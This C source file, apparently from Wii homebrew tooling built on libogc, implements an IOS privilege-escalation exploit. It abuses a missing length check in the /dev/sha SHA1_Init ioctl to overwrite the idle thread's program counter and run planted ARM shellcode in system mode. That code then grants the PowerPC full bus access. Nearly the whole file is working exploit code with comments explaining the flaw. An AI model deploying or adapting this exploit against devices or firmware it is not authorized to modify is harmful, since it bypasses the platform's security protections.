// haxx.c - PowerPC privilege elevation
//   Written by Palapeli
//
// Copyright (C) 2022 Palapeli
// SPDX-License-Identifier: MIT

#include "haxx.h"
#include <stdio.h>
#include <unistd.h>
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wpedantic"
#include <gctypes.h>
#include <gcutil.h>
#include <ogc/ipc.h>
#include <ogc/machine/processor.h>
#pragma GCC diagnostic pop

#define HW_SRNPROT 0x0D800060
#define HW_BUSPROT 0x0D800064

// Performs an IOS exploit and branches to the entrypoint in system mode.
//
// Exploit summary:
// - IOS does not check validation of vectors with length 0.
// - All memory regions mapped as readable are executable (ARMv5 has no
//   'no execute' flag).
// - NULL/0 points to the beginning of MEM1.
// - The /dev/sha resource manager, part of IOSC, runs in system mode.
// - It's obvious basically none of the code was audited at all.
//
// IOCTL 0 (SHA1_Init) writes to the context vector (1) without checking the
// length at all. Two of the 32-bit values it initializes are zero.
//
// Common approach: Point the context vector to the LR on the stack and then
// take control after return.
// A much more stable approach taken here: Overwrite the PC of the idle thread,
// which should always have its context start at 0xFFFE0000 in memory (across
// IOS versions).
s32 Haxx_IOSExploit(u32 entrypoint)
{
    s32 fd = IOS_Open("/dev/sha", 0);
    if (fd < 0)
        return fd;

    printf("Exploit: Setting up MEM1\n");
    u32* mem1 = (u32*)0x80000000;
    mem1[0] = 0x4903468D; // ldr r1, =0x10100000; mov sp, r1;
    mem1[1] = 0x49034788; // ldr r1, =entrypoint; blx r1;
    /* Overwrite reserved handler to loop infinitely */
    mem1[2] = 0x49036209; // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    mem1[3] = 0x47080000; // bx r1
    mem1[4] = 0x10100000; // temporary stack
    mem1[5] = entrypoint;
    mem1[6] = 0xFFFF0014; // reserved handler

    ioctlv vec[4] ATTRIBUTE_ALIGN(32);
    vec[0].data = NULL;
    vec[0].len = 0;
    vec[1].data = (void*)0xFFFE0028;
    vec[1].len = 0;
    // Unused vector utilized for cache safety
    vec[2].data = (void*)0x80000000;
    vec[2].len = 32;

    printf("Exploit: Doing exploit call\n");
    s32 ret = IOS_Ioctlv(fd, 0, 1, 2, vec);

    IOS_Close(fd);
    return ret;
}

// Flushes data on PowerPC and invalidates on ARM.
void Haxx_FlushRange(const void* data, u32 length)
{
    // The IPC function flushes the cache here on PPC, and then IOS invalidates
    // its own cache.
    // Note: Neither libogc or IOS check for the invalid fd before they do what
    // we want, but libogc _could_ change. Keep an eye on this.
    IOS_Write(-1, data, length);
}

// Checks if the PPC has full bus access.
bool Haxx_CheckBusAccess()
{
    if ((read32(HW_BUSPROT) & 0x80000DFE) != 0x80000DFE)
        return false;

    if ((read32(HW_SRNPROT) & 0x08) != 0x08)
        return false;

    return true;
}

static const u32 armCode[] = {
    0xE3A00536, // mov     r0, #0x0D800000
    0xE5901060, // ldr     r1, [r0, #0x60]
    0xE3811008, // orr     r1, #0x08
    0xE5801060, // str     r1, [r0, #0x60]
    0xE5901064, // ldr     r1, [r0, #0x64]
    0xE381113A, // orr     r1, #0x8000000E
    0xE3811EDF, // orr     r1, #0x00000DF0
    0xE5801064, // str     r1, [r0, #0x64]
    0xE12FFF1E, // bx      lr
};

// Attempts to get full PPC bus access. Will perform an IOS exploit if needed.
bool Haxx_GetBusAccess()
{
    // Do nothing if we already have bus access
    if (Haxx_CheckBusAccess())
    {
        printf("Already have bus access, skipping exploit\n");
        return true;
    }

    // If just the PPCKERN bit is set then we can just set the other bits
    if (read32(HW_BUSPROT) & 0x80000000)
    {
        printf("Already have PPCKERN, setting other bits\n");
        mask32(HW_BUSPROT, 0, 0x80000DFE);
        mask32(HW_SRNPROT, 0, 0x08);
        return true;
    }

    // No access so we must run the IOS exploit
    Haxx_FlushRange(armCode, sizeof(armCode));

    s32 ret = Haxx_IOSExploit((u32)armCode & ~0xC0000000);
    printf("IOS exploit call result: %d\n", ret);

    // The exploit realistically couldn't have run if the result is less than
    // zero.
    if (ret >= 0)
    {
        printf("Waiting for bus access...\n");
        // XXX timeout
        while (!Haxx_CheckBusAccess())
        {
            usleep(1000);
        }
    }

    return Haxx_CheckBusAccess();
}